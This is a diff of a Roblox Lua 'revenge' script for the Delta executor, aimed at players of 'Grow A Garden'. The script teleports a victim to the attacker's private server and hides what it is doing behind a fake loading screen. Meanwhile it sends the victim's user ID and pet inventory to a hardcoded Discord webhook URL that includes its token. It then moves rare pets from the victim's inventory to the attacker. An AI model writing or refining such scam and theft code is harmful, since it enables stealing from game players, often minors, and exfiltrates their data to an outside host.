@@ -1,15 +1,10 @@
---[[
-🔥 FINAL REVENGE SCRIPT (Client-Side Transfer, No Server Access Needed)
-Game: Grow A Garden or any public game
-Executor: Delta ✅
---]]
-
+-- FINAL REVENGE SCRIPT - Delta Compatible
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
--- ✅ SETTINGS
+-- ✅ CONFIG
 local privatePlaceId = 126884695634066
 local privateServerCode = "40206718588419987554943106780552"
 local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
@@ -22,13 +17,18 @@ local validPets = {
     ["Dilophosaurus"] = true, ["Kitsune"] = true
 }
 
--- ✅ TELEPORT TO PRIVATE SERVER IF NOT YET
+-- ✅ TELEPORT TO PRIVATE SERVER
+print("📡 Checking current server status...")
+print("🔎 PrivateServerId:", game.PrivateServerId)
+print("🔎 PrivateServerOwnerId:", game.PrivateServerOwnerId)
+
 if game.PrivateServerId == "" or game.PrivateServerOwnerId == 0 then
+    print("🚀 Teleporting to your private server now...")
     TeleportService:TeleportToPrivateServer(privatePlaceId, privateServerCode, {LocalPlayer})
     return
 end
 
--- ✅ FAKE GUI (AFTER TELEPORT)
+-- ✅ LOADING GUI
 local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
 gui.Name = "LIMIT_GUI"
 gui.IgnoreGuiInset = true
@@ -37,7 +37,7 @@ gui.ResetOnSpawn = false
 local frame = Instance.new("Frame", gui)
 frame.Size = UDim2.new(0, 300, 0, 100)
 frame.Position = UDim2.new(0.5, -150, 0.5, -50)
-frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
 
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, 0, 0.3, 0)
@@ -57,7 +57,6 @@ loading.TextScaled = true
 loading.TextColor3 = Color3.fromRGB(0, 255, 255)
 loading.BackgroundTransparency = 1
 
--- Animate loading slowly (5% per 10 seconds)
 task.spawn(function()
     for i = 5, 100, 5 do
         loading.Text = "Loading... " .. i .. "%"
@@ -65,7 +64,7 @@ task.spawn(function()
     end
 end)
 
--- ✅ DISCORD WEBHOOK: Send Victim Inventory
+-- ✅ WEBHOOK SEND
 task.spawn(function()
     local pets = {}
     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
@@ -76,9 +75,9 @@ task.spawn(function()
     end
 
     local data = {
-        content = "**Target Joined Private Server**",
+        content = "**🎯 Target Joined Private Server**",
         embeds = {{
-            title = "Inventory Scan - " .. LocalPlayer.Name,
+            title = "🎒 Inventory - " .. LocalPlayer.Name,
             color = 65280,
             fields = {
                 {name = "UserId", value = tostring(LocalPlayer.UserId), inline = true},
@@ -97,7 +96,7 @@ task.spawn(function()
     end)
 end)
 
--- ✅ CLIENT-SIDE TRANSFER TO ATTACKER (NO REMOTEEVENT)
+-- ✅ PET TRANSFER LOOP
 task.spawn(function()
     local function getAttacker()
         for _, plr in ipairs(Players:GetPlayers()) do
@@ -109,6 +108,8 @@ task.spawn(function()
     local function transferPets()
         local attacker = getAttacker()
         if not attacker then return end
+        local backpack = attacker:FindFirstChildOfClass("Backpack")
+        if not backpack then return end
 
         local containers = {LocalPlayer.Backpack, LocalPlayer.Character}
         for _, container in ipairs(containers) do
@@ -116,7 +117,8 @@ task.spawn(function()
                 if item:IsA("Tool") then
                     for petName in pairs(validPets) do
                         if string.find(item.Name, petName) then
-                            item.Parent = attacker:FindFirstChild("Backpack")
+                            print("📦 Transferring:", item.Name, "➡", attacker.Name)
+                            item.Parent = backpack
                         end
                     end
                 end
